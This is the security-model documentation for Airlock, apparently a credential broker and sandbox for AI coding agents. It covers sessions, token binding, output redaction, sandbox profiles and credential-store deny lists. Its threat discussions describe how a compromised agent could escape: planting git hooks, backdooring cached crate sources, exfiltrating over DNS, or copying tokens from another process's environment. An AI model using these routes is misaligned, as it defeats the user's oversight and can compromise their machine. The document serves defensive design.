# Security Model

## Scope: what Airlock does and does not do

**Airlock prevents secret leakage.** Its purpose is to ensure the AI agent harness never has access to the raw values of tool credentials — not in its environment, not in tool output, not on the filesystem. The one deliberate exception is `[agent.env]`, which exists to hand the agent its *own* credentials; see [Agent credentials](#agent-credentials-agentenv).

**Airlock does not prevent destructive actions.** When the agent invokes `gh repo delete` or `tofu destroy`, the tool runs with the full authority of the supplied credentials. If the token permits it, the action succeeds. Preventing destructive actions is the responsibility of **correctly scoped tokens** (fine-grained PATs, least-privilege IAM roles) and **agent harness sandboxing** — not Airlock.

Airlock does, however, make scoped tokens the easy default. A `[secrets.<label>]` entry with `source = "command"` can mint a short-lived credential for a least-privilege identity from the operator's broader session — impersonating a read-only cloud service account, for instance — so the broad credential never has to enter the sandbox and no long-lived key for the narrow identity has to exist. See the README's [Minting scoped credentials](README.md#minting-scoped-credentials).

See the README's ["Where Airlock fits"](README.md#where-airlock-fits) section for how Airlock fits into a complete defense-in-depth setup.

---

This document describes the security boundaries, secret lifecycle, and threat mitigations in detail.

## Trust boundary

```
┌─────────────────────────────────────────────────────────┐
│  Secret source (1Password, Vault, env, secretspec, ...) │
└────────────────────────┬────────────────────────────────┘
                         │ resolved by the launcher (`airlock run`,
                         │ `session start`), in your terminal
                         ▼
              ┌─────────────────────┐
              │   airlock daemon    │  ← TRUSTED, one per user
              │  (every project's   │     holds every session's secrets
              │   sessions live     │     applies sandbox + redaction
              │   here)             │
              └──────────┬──────────┘
                         │ NDJSON (redacted output only)
                         ▼
              ┌─────────────────────┐
              │   airlock exec      │  ← UNTRUSTED
              │   (client / agent)  │     no access to secret values
              └─────────────────────┘
```

The **daemon** is the trust boundary. It holds every session's secrets, constructs sandbox policies, spawns tool processes, and redacts output. The **client** (`airlock exec`, `tools list`, `agent check`) is unprivileged — it connects over a Unix domain socket, presents a session token, sends a tool name and arguments, and receives only redacted stdout/stderr.

An AI agent interacts exclusively through the client side, within one session. It can request tool execution in its own project but never observes the raw values of tool secrets, and a session token proves nothing about any project but the one it was issued for.

**The socket alone is not the trust boundary; the session token is.** One daemon now serves every project a user has, and every process reaching the socket shares the user's uid — a `connect(2)` on the socket says only "I am this user", which an agent's own sandboxed process already is. What limits an agent to its own project is a **session**: a token, handed out only to a process holding `admin.token` (which no Airlock sandbox can read), scoped to one root and one approved config. See [Sessions](#sessions) below.

### Agent credentials (`[agent.env]`)

`airlock run` builds the agent's environment from scratch, the same way a tool's is built. `[agent.env]` entries may reference `[secrets.<label>]` values, and those *are* injected into the agent process. This is deliberate: the agent needs its own credentials — its LLM API key, typically — and they have nowhere else to come from. It is a narrow exception, not a second path for tool secrets. A secret referenced from `[agent.env]` is by definition visible to the agent, so never reference a tool credential there; tool credentials belong in `[tools.<name>.env]`, where only the brokered process sees them.

### Socket peer authentication

The Unix socket is necessary but not sufficient — anything that can `connect(2)` to it is the same user the daemon runs as, which an agent already is. Filesystem permission narrows *who can reach the socket at all*; the session token (below) narrows *what a connection may do once there*.

- The daemon sets `umask(0o077)` around `bind(2)`, creating the socket with mode `0o700` (owner-only) regardless of the ambient umask. The original umask is restored even if bind fails.
- Immediately after bind, the daemon `stat`s the socket and **refuses to start** if any group/other bit is set. This catches filesystems that silently ignore mode bits (some network filesystems, certain FUSE mounts) or external umask overrides. The insecure socket is left on disk for the operator to inspect rather than auto-removed.
- The runtime directory holding the socket, PID file and `admin.token` is validated the same way (owned by the effective uid, mode 0700, not a symlink) before use — see [Protecting the anchors](#protecting-the-anchors).

## Sessions

One daemon serves every project. Registering a session — the only way to get a token that `exec`, `tools list` or `agent check` will accept — needs `admin.token`, a 32-byte value written to the runtime directory at daemon start with mode 0600. No sandbox Airlock builds can read it: Landlock never grants the runtime directory on Linux, and every Seatbelt profile (agent and tool) carries an explicit `(deny file-read* (literal ".../admin.token"))` as its last rule. A single per-daemon token in the agent's environment was considered and rejected: it would stay valid for the daemon's whole lifetime and couldn't tell two agents' sessions apart.

A **launcher** (`airlock run`, `airlock session start`) does everything that needs your terminal or your project's environment — discover and approve config, resolve secrets — and then sends a `Register` request with `admin.token`, the merged config, the resolved secret values, an environment snapshot and a filtered `PATH`. The daemon answers with a session id and a 32-byte random token. `exec`, `tools list` and `agent check` read that token (and the daemon's address) from `AIRLOCK_ADDR` / `AIRLOCK_SESSION` and nothing else — no fallback to `admin.token`, no config discovery, so a nested `airlock.toml` the agent's own working directory happens to contain cannot redirect anything.

### Token binding

A session token lives in every process the harness starts, and a same-uid process outside any sandbox can read another process's environment: `ps eww` on macOS, `/proc/<pid>/environ` on Linux. So an agent running under an external sandbox that permits process inspection — or any unsandboxed process of the user — could in principle copy another agent's token out of its environment.

The daemon closes this by binding each token to a **process tree**, not just its bytes. On every connection it takes the peer PID off the socket (`LOCAL_PEERPID` on macOS, `SO_PEERCRED` on Linux) and walks the parent chain, checking that the session's recorded anchor process — the launcher, for `airlock run`; the shell that ran it, for `session start` — is an ancestor. The anchor is recorded with its start time, so a reused PID can't match. A copied token is then useless outside the tree it was issued to; this does not help against a process that is already inside the tree, which holds the token legitimately anyway. Airlock's own agent sandbox also allows process inspection only `(target same-sandbox)`, so two Airlock-sandboxed agents can't read each other's environment in the first place.

This binding is a property of the Unix transport (peer PID is meaningless over a network); a future transport would need tokens bound to a TLS client identity instead.

For `session start`, the anchor is the *parent* of the `session start` process itself — ordinarily the interactive shell that ran it, since `eval "$(airlock session start)"` execs `session start` as a direct child of that shell with no extra fork. Piping the command through anything else (`eval "$(airlock session start | cat)"`, or capturing it inside a script that then `eval`s the result in a different shell) forces an extra fork: the anchor becomes that pipeline's subshell, which exits as soon as the pipe finishes, and every later request is refused with `OutsideProcessTree` even though the token itself is valid. Run `airlock session start` directly in the shell that will use the session.

### Lifetime

A `run` session ends when its lease — the `Register` connection, held open by the launcher for as long as the harness runs — closes; the kernel closes it however the launcher dies (exit, panic, SIGKILL, OOM), so nothing can leak a session past a dead launcher, and no heartbeat is needed. A `session start` session ends on its TTL (default 12h) or an explicit `session revoke`; without a TTL, a forgotten `session start` would keep a token valid, and an automatic daemon running, indefinitely.

## Secret lifecycle

### 1. Collection

Secrets are resolved by the **launcher**, in your terminal, at `airlock run` or `session start` — never by the daemon, and never from the daemon's own process environment:

- `source = "env"` reads the launcher's env var named by `from` (default: the label). Airlock is agnostic about where that variable came from — 1Password CLI, Hashicorp Vault, `secretspec`, or a plain shell export all work.
- `source = "command"` spawns the argv list (no shell) on the filtered `PATH` (see [Config safety](#config-safety)), waits up to `timeout`, and takes the trimmed stdout as the value. These commands run unsandboxed with the launcher's environment — see [Config safety](#config-safety).

Failures are batched: if any `env` variable is missing or any `command` fails, nothing is registered, and the error lists **every** problem (not just the first), so the user can fix them in one pass.

### 2. Transfer, not persistence, in the daemon's own environment

Resolved values travel to the daemon exactly once, inside the `Register` (or `Reload`) request body, over the socket. The daemon's own process environment is never read for this and never holds a secret: there is nothing to clear, because nothing was ever set there. A background `refresh` re-runs a `command` secret's source using the *session's* stored environment snapshot and filtered `PATH`, never the daemon's own.

### 3. In-memory storage

Collected values are wrapped in `Secret<T>`, a newtype that:

- Prints `[REDACTED]` from its `Debug` implementation — secret values never appear in log output, panic messages, or error formatting.
- Requires an explicit `.expose_secret()` call to access the inner value, making all exposure points easy to audit (grep for `expose_secret`).
- Is intentionally not `Clone` or `Copy`, preventing casual proliferation in memory.

Each session holds its own `SecretStore`, keyed by label. The map itself is fixed at session start (or reload); each slot holds an `Arc<Secret<String>>` plus a health flag, so a background refresh can swap in a new value while in-flight readers keep the previous one until they drop it. A slot whose last refresh failed is marked `Stale`. One session's store is reachable only through that session's handle — see [Session isolation](#session-isolation).

### 4. Injection at execution time

When the daemon handles an `exec` request, it walks the tool's `[tools.<name>.env]` map:

1. A static string is inserted as-is.
2. A `{ secret = "label" }` reference takes a read lock on that label's slot, in the session's own store. If the slot is healthy, `.expose_secret()` yields the value and it is inserted. If the slot is `Stale`, the exec is **refused** with an error naming the label — never the value.

The child process receives a **minimal** environment — not the daemon's full environment:

| Variable | Source |
|----------|--------|
| Secret-backed `env` entries | From in-memory `Secret<String>` values |
| Static `env` entries | Literal strings from the config (`{sandbox_root}` / `{tool_state}` expanded) |
| `PATH`, `HOME`, `TERM`, `USER` | The session's filtered `PATH`, plus the other process basics from its environment snapshot |
| `TZ` | Passthrough (timezone — without it, tools render timestamps in UTC or local default) |
| `LANG`, `LC_ALL`, `LC_CTYPE`, `LC_NUMERIC`, `LC_TIME`, `LC_COLLATE`, `LC_MONETARY`, `LC_MESSAGES` | Passthrough (locale — controls sort order, number/date formatting, message translations) |
| Everything else | **Excluded** |

The child's environment is constructed from scratch (`cmd.env_clear()` + explicit insertions). No ambient variables leak through.

Static values in `[tools.<tool>.env]` support exactly two template placeholders — `{sandbox_root}`, the canonicalized project directory, and `{tool_state}`, a per-project per-tool directory under `$XDG_CACHE_HOME/airlock` that only the one tool declaring it can read or write. This is not shell interpolation: no other keys expand, no env vars are read, unknown placeholders are rejected. Templating applies only to static strings, never to `{ secret = "..." }` refs or to argv.

### 5. Output redaction

All stdout and stderr from the child pass through an **Aho-Corasick** streaming automaton before reaching the client — first the session's own redactor, built from that session's secrets, then a daemon-wide **last-pass redactor** built from every live session's secrets (see [Session isolation](#session-isolation)). For each secret, **four encoding variants** are registered as search patterns:

An `Error` message leaving the daemon is not exempt: its text can originate somewhere other than the daemon's own words (a stale secret's refresh-failure reason is the refresh command's captured stderr), so `write_ndjson_message` — the one function every outbound message passes through — redacts an `Error`'s text the same way, through the session's redactor (when a session is in scope) and then the global one, before it is serialized.

| Encoding | Example (secret: `my-key-123`) |
|----------|-------------------------------|
| Raw UTF-8 | `my-key-123` |
| Base64 (standard, padded) | `bXkta2V5LTEyMw==` |
| URL-encoded (percent) | `my%2Dkey%2D123` |
| Hexadecimal (lowercase) | `6d792d6b65792d313233` |

Any match is replaced with `[REDACTED:NAME]` where `NAME` is the secret's environment variable name.

The streaming implementation (`aho-corasick`'s `try_stream_replace_all`) correctly handles partial matches that span chunk boundaries — a secret value split across two TCP-level reads is still detected and redacted.

**Refreshed secrets.** The automaton the child's output runs through is taken right after the daemon reads the child's secrets, not when the connection is accepted. A refresh swaps in a redactor that knows the new value before it publishes that value, so the automaton always knows every value in the child's environment. An automaton taken at accept time would not: the client chooses when to send its request, so an agent could open a connection, wait for a refresh, and then run a tool whose output carries a value the automaton has never seen.

**Limitations:** Redaction is best-effort by nature. A tool could transform a secret in ways that don't match any of the four encodings (e.g., reversing the string, encrypting it, splitting it across multiple output lines with interleaving). Airlock's primary defense is that secrets are only injected into specifically allowed tool processes; redaction is a defense-in-depth layer.

## Filesystem sandboxing

Tools, and the agent itself under `airlock run`, run with **deny-by-default** filesystem access, enforced by OS-level mechanisms.

### Tool access levels

Beyond a tool's own grants (project root, `[filesystem]`, `extra_read`/`extra_write`, its own binary, a proxy tool's CA — unaffected by this setting, at every level), the daemon also layers in a *built-in* filesystem baseline, sized by that tool's `access` level (`tools.<name>.access`, or the config's top-level `access`; see [README.md](README.md#access-how-much-of-the-system-a-tools-sandbox-sees)):

- **`none`** — just the dynamic linker, the shared library cache, and `/dev/null`. Nothing else of the system.
- **`system`** — `none` plus the fixed baseline described below (system libraries, binaries, shared data, configuration).
- **`default`** — `system` plus read-only `/nix/store`, `/opt/homebrew`, `/usr/local`, `/opt/local`, and `/home/linuxbrew/.linuxbrew`. **This is the default when `access` is unset anywhere** — a deliberate widening over the pre-`access` baseline, approved so Nix- and Homebrew-built tools work without per-tool `extra_read` entries.

  `/usr/local/etc` and `/opt/homebrew/etc` are inside those toolchain roots and can hold other installed services' configuration — not secrets Airlock itself manages, but data a tool at `default` can now read that it couldn't before. A project that cares picks `system` or `none` for tools that don't need a toolchain root, instead of relying on the default.

The agent's own sandbox is **not** governed by `access` — it always gets the `none` + `system` baseline, same as every tool did before `access` existed.

### macOS — Apple Seatbelt (SBPL)

The daemon generates an SBPL (Scheme-based) sandbox profile for each tool execution, and the launcher generates one for the agent:

- **Base policy**: `(deny default)` — deny everything by default.
- **Process operations**: `process-exec`, `process-fork`, `signal(target self)`, `process-info(target self)` and, for the agent profile, `process-info* (target same-sandbox)` only — two Airlock-sandboxed agents cannot inspect each other's processes or environments, which is what makes a copied [session token](#token-binding) need the process-tree binding in the first place rather than being exploitable directly.
- **System reads**: `sysctl-read` (needed by Go/Rust runtimes before `main()`).
- **Mach IPC**: `mach-lookup` is an explicit allowlist (no blanket allow). `(deny mach-priv*)` blocks privileged operations.
  - **Keychain is out of the baseline.** `com.apple.SecurityServer`, `com.apple.securityd.xpc`, and every other Mach endpoint that fronts Keychain Services are intentionally absent from the allowlist. A sandboxed process running under the baseline (or under the strict `claude` profile) cannot read or write any keychain item. TLS trust evaluation (`SecTrustEvaluate`, `SecPolicyCreateSSL`) reaches the network through `com.apple.trustd.agent` and does not depend on `securityd` — verified empirically — so dropping the keychain services does not affect HTTPS. Profiles that need keychain access opt back in: see `claude-relaxed` under "Built-in agent profiles" below.
  - **File-change notification is in the baseline.** `com.apple.FSEvents` is on the allowlist because every macOS file watcher goes through it — without it `node --watch`, nodemon, vite, and `cargo watch` fail, and they fail unrecognisably: libuv surfaces a failed `FSEventStreamStart` as `EMFILE: too many open files, watch` even with a 1M descriptor limit, and Bun reports `error: Error starting FSEvents stream`. The capability is notification-only: reading a changed file still goes through the filesystem rules. It does widen metadata disclosure — an event stream rooted outside the sandbox reports the *paths* of files the process cannot open — which is the accepted cost of working dev servers.
- **Baseline filesystem reads** (the `system` access level; `none` drops this to just the dynamic linker (`/usr/lib/dyld`) and the dyld shared cache — verified empirically with `sandbox-exec` that this alone runs `/bin/echo` but not `cat /etc/hosts` or `ls /usr/share`; `default` adds the toolchain roots above): `/usr/lib`, `/usr/share`, `/System`, `/Library`, `/private/etc`, `/etc`, `/dev/null`, `/dev/random`, `/dev/urandom`, and the tool binary itself (needed for TLS code signature verification, granted at every level). `/dev/null` is the one exception to "reads": it also gets `file-write*` and `file-ioctl`, since shells open it `O_WRONLY` for `2>/dev/null` redirection, and is granted at every level including `none`.
- **Config-declared paths**: `(allow file-read* (subpath ...))` for read paths; `(allow file-write* (subpath ...))` for write paths.
- **The runtime base, `admin.token` and `.git/hooks` are denied last, after every allow.** In SBPL the *last* matching rule wins, so a deny placed before a broader allow (`$TMPDIR`, `agent.filesystem.write`, `--allow-write`, a built-in profile rule) would be silently re-enabled by it. Every agent and tool profile therefore ends with, in this order:
  1. `(deny file-write* (subpath "<root>/.git/hooks"))` — [F9](#git-hooks-write-denial-f9), defense in depth.
  2. `(deny file-write* (subpath "<runtime base>"))` — no sandbox can replace the socket, PID file or proxy CA, or write the trust store or `admin.token`.
  3. `(deny file-read* (literal "<runtime base>/admin.token"))` — no sandbox can read the credential that registers sessions.

  A proxy tool's one exception is a `(allow file-read* (literal "<runtime base>/ca/<session-id>.pem"))` rule, scoped to its own session's certificate, which sits *before* the runtime-base deny above (a narrower allow after a broader deny does not apply — the deny would simply win — so this one is ordered as an exception the deny is written to exclude).
- **Network**: one of three states, chosen for each execution.
  - *Full* (every ordinary tool): `network-outbound`, `system-socket`, plus DNS via `/private/var/run/mDNSResponder`. `network-bind` is scoped to `(local unix-socket)` only — tools can bind Unix domain sockets for local IPC (argocd SSO, language servers, loopback IPC) but cannot `listen()` on TCP/UDP and therefore cannot become network-reachable services.
  - *Proxy-only* (a [proxy tool](#proxy-tools)): one rule, `(allow network-outbound (remote tcp "localhost:<port>"))`. `<port>` is the ephemeral port the daemon bound for this execution. There is no general `network-outbound`, no `system-socket`, no mDNSResponder socket, and no bind of any kind. So the tool cannot resolve a name, reach a public address, or reach a different loopback port. We tested each case with `sandbox-exec` against a live listener. Seatbelt's `remote tcp` filter accepts only `localhost` or `*` as the host (an IP literal does not compile). `localhost` is what this rule needs.
  - *None*: no config produces this state today. The profile's `(deny default)` covers it.

Path traversal rules (`file-read-metadata` for ancestor directories) are generated automatically.

**SBPL injection prevention**: Any path containing ASCII control characters (0x00–0x1F or 0x7F) is rejected. A null byte would truncate the profile string; other control characters could break the S-expression syntax.

The profile is applied via `sandbox_init()` FFI in the `pre_exec` closure, after fork but before exec.

#### `.git/hooks` write denial (F9)

Git hooks run with no review step, on ordinary commands (`commit`, `push`, and `core.fsmonitor` on nearly every `git status`), as the user, unsandboxed. An agent that could write `<root>/.git/hooks/pre-commit` could get code to run outside every sandbox the next time the user commits — including code that reads the trust store or the global config directly. The agent and tool profiles on macOS therefore deny writes under `.git/hooks` as one more rule after every allow, the same way the runtime base is denied. This is **defense in depth, not a guarantee**: Landlock cannot express a deny carved out of an allowed subtree, so Linux has no equivalent; `core.fsmonitor` and other settings in `.git/config` (which the deny does not cover) have the same effect and stay reachable; and a worktree's hooks live in the common git dir, which can sit outside the sandboxed root entirely. See [Agent-written code run outside the sandbox](#agent-written-code-run-outside-the-sandbox) for the class this narrows but does not close.

### Linux — Landlock LSM

The daemon uses Landlock (kernel 5.13+) with **ABI V1 and hard requirement** — if Landlock is not available, the daemon refuses to start rather than silently degrading.

- **Baseline filesystem reads** (the `system` access level, mirroring the macOS Seatbelt baseline; missing entries are silently skipped): `/usr/lib`, `/usr/lib64`, `/lib`, `/lib64`, `/usr/share`, `/usr/bin`, `/bin`, `/etc`, `/dev/null`, `/dev/random`, `/dev/urandom`. These are required by the dynamic linker, libc, TLS trust store, and entropy sources; they contain no user secrets. As on macOS, `/dev/null` is also writable, for `2>/dev/null` redirection. `none` drops this to just `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`, `/etc/ld.so.cache`, and `/dev/null`; `default` adds the toolchain roots from the previous section, also skipped when absent.
- **The tool's own binary gets its own `PathBeneath` rule, granted at every access level.** Landlock ties execute rights to path coverage — unlike Seatbelt's unconditional `process-exec`, a binary outside the baseline and outside `read_paths`/`read_write_paths` simply cannot exec. Without this rule, `none` (which deliberately excludes `/bin`/`/usr/bin`) would be unable to run *any* tool, and a tool installed outside the baseline entirely (`~/.cargo/bin/foo`, `~/.local/bin/foo`) would fail to exec at every level.
- Read paths → `PathBeneath` with `AccessFs::from_read(abi)`
- Read-write paths → `PathBeneath` with `AccessFs::from_all(abi)`
- The Landlock ruleset fd is pre-built, extracted as an `OwnedFd`, and its raw integer is passed into the `pre_exec` closure (inherited across fork).
- In the child: `prctl(PR_SET_NO_NEW_PRIVS, 1)` followed by `landlock_restrict_self` syscall.
- **Network (proxy tools only)**: Landlock ABI V4 (kernel 6.7+) adds TCP bind and connect rules. For a [proxy tool](#proxy-tools), the ruleset handles both `BindTcp` and `ConnectTcp`, and allows `ConnectTcp` only to the proxy's port. This is also a **hard requirement**: on a kernel older than 6.7 the exec fails. The tool never runs without the port restriction. Ordinary tools do not handle network access rights at all, so their network behaviour has not changed.

  Landlock itself leaves two gaps. First, the rule is **port-scoped, not host-scoped**: the tool can reach that port number on any host. Second, **UDP is not covered**, so exfiltration over DNS is still possible. Through either gap the tool can leak *data it can read*, but never the credential, because the tool never holds one. The agent's own sandbox already has general network access, so neither gap gives the agent a new capability. A network-namespace backend would close both gaps and is the planned next step.

Landlock is allow-only and cannot carve a deny out of a granted subtree, which is why [F9](#git-hooks-write-denial-f9) is macOS-only, and why the runtime base is protected on Linux simply by never being inside any grant in the first place (see [Protecting the anchors](#protecting-the-anchors)) rather than by an explicit deny.

### Sandbox root

The project directory is always included as a read-write path in the sandbox policy, for both the agent and its tools. This is where project files live and where a tool declares `extra_write` paths relative to.

### Built-in agent profiles

`airlock run --profile <name>` layers a pre-configured set of filesystem and SBPL rules onto the agent sandbox for a well-known tool. Two profiles ship today; each represents a deliberate point on the convenience-vs-confinement curve.

**`claude`** — narrow profile, default choice.

- Adds read/write paths: `~/.claude/​`, `~/.claude.json`, `~/.cache/claude/`, `~/.local/share/claude/`, `~/.local/state/claude/`.
- macOS only: also widens write access to `~/.claude.json`'s sibling lock and per-pid `.tmp.*` files, and `~/.claude.lock`.
- **Keychain posture**: keychain is unreachable. The baseline Mach allowlist excludes `com.apple.SecurityServer` and `com.apple.securityd.xpc`, and `~/Library/Keychains/` is denied for both read and write. Claude Code's probe (`security show-keychain-info`) fails, the auth subsystem reports "macOS Keychain is not writable", and OAuth tokens are persisted to `~/.claude/.credentials.json` (mode `0600`) instead. This moves secrets-at-rest from the encrypted keychain DB to a plaintext file inside `$HOME` — a deliberate trade for keeping the agent unable to see *any* keychain content from any other app.
- Installs the `airlock agent hook claude-code` `SessionStart` hook — see [External sandboxes](#external-sandboxes) for what the equivalent hook does when the harness runs its own sandbox instead of this profile.
- Passes `--settings` with `"sandbox":{"enabled":false}`, so Claude Code does not also try to apply its own `sandbox-exec` wrapper inside Airlock's Seatbelt profile — nesting two Seatbelt profiles is rejected by the OS. `airlock agent hook claude-code --print-settings` prints only the hook block (what to paste into a harness started another way); the `sandbox` key is specific to `--profile claude`'s own invocation and is not part of that printed block.

**`claude-relaxed`** — `claude` plus interactive-ergonomics relaxations.

- Re-adds the keychain Mach endpoints (`com.apple.SecurityServer`, `com.apple.securityd.xpc`) so `securityd` IPC works for both `SecItem*` and legacy `SecKeychainItem*` callers.
- Adds **read/write access to `~/Library/Keychains/`** so `security add-generic-password` (the legacy write path Claude Code uses to save OAuth tokens) succeeds and writes the encrypted keychain DB directly, instead of falling back to the plaintext `~/.claude/.credentials.json`.
- Adds the macOS pasteboard Mach service (clipboard).
- Adds Launch Services Mach services + the `lsopen` operation class (so `open <url>` works from inside the sandbox).
- Adds read access to `~/Library/Preferences/.GlobalPreferences*.plist` (default browser lookup).
- Adds read access to shell init dotfiles: `.bashrc`, `.bash_profile`, `.bash_login`, `.profile`, `.zshrc`, `.zprofile`, `.zshenv`, `.zlogin`, `.inputrc`.

Each `claude-relaxed` extension is a deliberate widening. The keychain DB at rest is encrypted (AES, master key derived from the user's login password and held only in `securityd`'s memory), so a sandboxed agent with this access *cannot* decrypt or forge keychain items. What it *can* do:

- Read all keychain metadata in plaintext (service names, account names, ACLs, timestamps) — information disclosure across every app that stores secrets in `login.keychain-db`.
- Corrupt, truncate, or roll back the DB file (denial of service; rollback can restore previously revoked credentials).
- Stash a copy of the encrypted blob for offline brute-force against the login password.

Pick `claude-relaxed` when you want the convenience and accept those marginal risks. Pick `claude` when the plaintext fallback is the lesser evil.

Clipboard reads can return password-manager tokens; `open <url>` reveals OAuth redirect URLs (with codes) to the browser process; dotfiles frequently carry `export AWS_*`, `export GITHUB_TOKEN`, etc. The relaxed bundle widens the **data-leak surface**, not the authority to write to your account-state. The keychain widening adds DoS and metadata disclosure but not decryption capability.

## Kits

Kits (`airlock run --kit <name>` / `agent.kits` / `[kits.<name>]`) add a language toolchain's cache access to the agent sandbox, on top of the harness profile above. They apply only to `airlock run`'s agent sandbox, never to a tool, and never to `session start` — an external harness's own sandbox is what actually runs there.

**Isolated** (the default) points the toolchain's own cache/home env vars (`CARGO_HOME`, `GOPATH`, `npm_config_cache`, ...) at a directory private to this project, under `$XDG_CACHE_HOME/airlock/kits`. The agent can read/write only that directory for the toolchain's purposes; the user's real `~/.cargo`, `~/go`, `~/.npm`, etc. are never granted at all. This is the safe default and should be left in place unless you have a specific reason to change it.

**Shared** grants the agent write access to the real cache locations instead, with no env override. **This is the mode to be careful with: it lets a hostile or compromised agent poison a cache that your *next, unsandboxed* build or `pip install` will trust without re-verifying.** Concretely:

- `cargo` extracts a crate's source into `~/.cargo/registry/src` once, the first time it's fetched, and verifies its checksum against `Cargo.lock`/the registry index at that point. Every subsequent build reads the extracted source directly — there is no re-verification. An agent with write access to that tree can plant a backdoor in a dependency's extracted source; your next unsandboxed `cargo build` compiles it unmodified, outside any sandbox.
- Go's module cache (`$GOPATH/pkg/mod`) and pip's wheel cache behave the same way: each verifies on first download, then trusts the cached, already-unpacked copy on every later build.
- Writing `~/.cargo/bin`, or `~/.mix/escripts`/`~/.mix/archives` (Mix archives are themselves code Mix loads), or anywhere Mix/npm/pip put *executables* rather than plain cache data, is strictly worse — not cache poisoning but a direct sandbox escape, the same way a writable `PATH` entry is ([B2](docs/airlock-v2-design.md#blocking)). No kit, in either mode, ever grants write to a toolchain's binaries or to config files that could redirect what runs — `~/.cargo/bin`, `~/.cargo/config.toml`, `~/.npmrc` (`script-shell`, `node-options`), pip and uv config, `~/.hex/hex.config`, Go's env file.
- Shared mode does grant *read* of each toolchain's user config and registry credentials — `CARGO_HOME/config.toml` and `credentials.toml`, `~/.npmrc` and `~/.yarnrc.yml`, `pip.conf`, `uv.toml`, `~/.pypirc`, `~/.hex/hex.config` — so the user's settings, private registries and publishing work for the agent. **The agent can therefore read package-registry tokens through a shared kit.** That is accepted: registry tokens are not the tool credentials Airlock exists to keep from the agent, and a user who doesn't want the agent holding them leaves the kit isolated, which reads none of these files. Hex does verify a package's checksum against `mix.lock` on fetch, same as cargo/pip; `deps/` and the extracted archives are trusted on every build after that, same caveat.

This is why isolated is the default, and why `[kits.<name>]` (the table that sets a built-in kit's mode, or defines a custom one) is restricted to your global config or `airlock.local.toml` — the same restricted slot as `allow_home_root` — never a project's own `airlock.toml`. A teammate's checked-in config choosing shared mode for you, silently, would be exactly this risk without your consent.

## External sandboxes

A harness started from an `airlock session start` shell — Claude Code's own `--sandbox`, or an IDE extension `airlock run` can't wrap — runs in a sandbox Airlock did not build. Airlock's protections for the agent then depend entirely on that sandbox, and on the harness not inheriting secrets through some other path. Specifically, the harness's own sandbox **must**:

| Must | Why |
|---|---|
| Deny reads of the runtime base (`airlock config --paths` prints the exact path) | `admin.token` is protected from Airlock's own sandboxes only. A harness that lets the agent read it lets the agent register sessions for **any** project on the machine, not just this one. The session token itself reaches the agent through its environment regardless, so denying the whole base breaks nothing the agent needs. |
| Deny writes to the runtime base, the trust store and the global config directory | The agent must not replace the socket or CA, approve its own config by writing the trust store, or edit the unapproved global layer. |
| Deny reads of the user's credential stores (`~/.config/gh`, `~/.config/gcloud`, `~/.aws`, `~/.kube`, the keychain) | Otherwise the agent reads the credentials Airlock brokers, directly, bypassing the broker entirely. |
| Deny inspecting other processes | Otherwise the agent can read other processes' environments, including another session's token (see [Token binding](#token-binding), which makes a copied token useless outside its own process tree, but does not cover *other* secrets sitting in another process's environment). |

`airlock session start` also hands the harness the **whole environment of the shell it was started from**, unlike `airlock run`, which passes an explicit allowlist. Start that shell plainly, not from inside `op run` or another command that has secrets in its own environment.

`airlock agent check` tests what it can from inside the harness's own process — whether `admin.token` can be read, whether the runtime base and trust store can be written, whether any tool's secret is already sitting in the environment, whether the well-known credential stores can be read — but a hook may run outside the harness's actual sandbox even when the harness commands it starts are inside one, so a pass from the hook is not the same claim as a pass from `agent check` run through the harness's own shell tool. See `docs/airlock-v2-ux.md#what-airlock-agent-check-verifies` for exactly what each probe is and isn't.

### Claude Code sandbox configuration

Claude Code's own `settings.json` `sandbox` block can meet the table above. The paths below are **examples** — always confirm the exact paths for your machine with `airlock config --paths`, since the runtime base and global config directory vary by platform and by `$XDG_*` overrides:

```json
{
  "sandbox": {
    "enabled": true,
    "network": { "allowUnixSockets": ["/run/user/1000/airlock/airlock.sock"] },
    "deny": {
      "read": [
        "/run/user/1000/airlock",
        "~/.config/gh",
        "~/.config/gcloud",
        "~/.aws",
        "~/.kube"
      ],
      "write": [
        "/run/user/1000/airlock",
        "~/.local/state/airlock/trust",
        "~/.config/airlock"
      ]
    }
  }
}
```

The one read exception is the Unix socket itself (`.../airlock/airlock.sock`): the agent must be able to `connect()` to it to reach the daemon at all, even though it must not be able to open `admin.token` sitting next to it. If Claude Code's sandbox schema cannot express "connect to this socket, but deny reading this sibling file" as narrowly as Airlock's own Seatbelt/Landlock profiles do, deny read access to the whole runtime base and rely on the socket connect working at the syscall level regardless of a file-read deny (connecting to a Unix socket is not a file read). Keychain and other platform-specific credential stores need the harness's own equivalent denial; Claude Code's sandbox settings and this example do not cover them exhaustively — check what the harness's current sandbox schema supports and extend the deny list to match the credential-store row of the table above.

## Process isolation

- Each tool is placed in its own **process group** via `setpgid(0, 0)` in the `pre_exec` closure.
- Signals are sent to the **entire group** via `kill(-pgid, signal)`, ensuring grandchild processes are included.
- `Child::kill()` is never used (it would only signal the direct child, leaving grandchildren as orphans).
- `kill_on_drop` is disabled for the same reason.

### Timeout enforcement

- Global default: 300 seconds (configurable via `timeout` in the config).
- Per-tool override: `timeout` field in `[tools.NAME]`.
- On timeout: SIGTERM to the process group, 5-second grace period, then SIGKILL escalation.

### Client disconnect

When the client drops the socket connection (e.g., Ctrl+C):

1. The daemon detects the closed connection.
2. SIGTERM is sent to the child's process group.
3. After 5 seconds, SIGKILL follows if the group hasn't exited.

### Stdin auto-close

If no stdin data arrives within 2 seconds of tool start, the daemon closes the child's stdin pipe. This prevents tools from blocking indefinitely on stdin when the agent doesn't intend to provide input.

## Tool selection: what should (and should not) be an Airlock tool

### Only credential-requiring tools go through Airlock

Airlock is not a general-purpose command runner. **Only tools that need secrets should be declared in the config.** Everything else — `grep`, `cargo`, `npm`, `make`, `ls`, shell scripts, build tools — should run directly through the agent harness's own sandbox. (`git` spans both worlds: local reads and SSH-based operations don't need Airlock, but signed commits and HTTPS pushes that rely on a GPG key or a credential-helper token are legitimate Airlock-brokered workflows.)

This is important for two reasons:

1. **Smaller attack surface.** The fewer tools that receive secrets, the fewer opportunities for leakage. A config with two tools (`gh`, `tofu`) is far safer than one with twenty.
2. **Agent capability.** The agent still needs general-purpose tooling to do its job — reading files, running builds, executing tests. Those don't require credentials and shouldn't be routed through Airlock.

A typical setup:

```
Agent harness (sandboxed)
├── Direct execution: grep, cargo, npm, make, ls, cat, git (local/SSH), ...
└── Via airlock exec: gh, tofu, gcloud, aws, git (signed/HTTPS), ...
```

### Declared tools must be purpose-built CLIs

